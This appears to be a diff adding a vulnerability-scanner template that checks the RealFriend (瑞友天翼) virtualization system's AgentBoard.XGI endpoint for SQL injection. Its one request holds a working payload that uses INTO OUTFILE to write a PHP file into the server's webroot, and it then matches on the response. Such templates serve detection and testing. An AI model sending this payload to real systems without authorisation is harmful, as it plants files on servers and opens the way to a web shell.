@@ -1,0 +1,33 @@
+id: REALOR-agentboard-xgi-sql-injection
+
+info:
+  name: SQL Injection in 瑞友天翼应用虚拟化系统 AgentBoard.XGI
+  author: onewin
+  severity: high
+  description: Checks for SQL Injection vulnerability in REALOR-AgentBoard.XGI.
+  tags: sqlinj,vuln
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C404.php%22+--+-&cmd=UserLogin"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+      Accept-Language: "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
+      Accept-Encoding: "gzip, deflate"
+      Connection: "close"
+      Upgrade-Insecure-Requests: "1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '"result":1'
+        part: body
+        condition: or
